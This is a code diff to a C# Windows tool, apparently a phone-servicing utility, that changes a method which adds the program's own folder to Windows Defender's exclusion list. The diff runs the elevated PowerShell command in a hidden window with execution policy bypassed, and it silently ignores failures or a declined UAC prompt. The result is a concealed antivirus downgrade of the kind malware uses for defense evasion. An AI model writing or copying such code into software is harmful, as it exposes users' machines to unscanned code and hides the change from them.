@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Diagnostics;
 using System.Windows.Forms;
 
@@ -8,17 +8,26 @@ namespace iReverse_Unisoc_Ultimate
     {
         private static void AddExclusionWindowsDefender()
         {
-            string regval = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1", "Install", null)?.ToString();
-            if (!string.IsNullOrEmpty(regval) && regval.Equals("1"))
+            try
             {
-                var elevated = new ProcessStartInfo("powershell")
+                string regval = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1", "Install", null)?.ToString();
+                if (!string.IsNullOrEmpty(regval) && regval.Equals("1"))
                 {
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    Verb = "runas",
-                    Arguments = " -Command Add-MpPreference -ExclusionPath '" + System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + "'"
-                };
-                Process.Start(elevated);
+                    string dir = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
+                    var elevated = new ProcessStartInfo("powershell")
+                    {
+                        UseShellExecute = true,
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        Verb = "runas",
+                        Arguments = "-NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" + dir + "'"
+                    };
+                    Process.Start(elevated);
+                }
+            }
+            catch
+            {
+                // Silently ignore if Defender exclusion fails or user rejects UAC
             }
         }
         /// <summary>
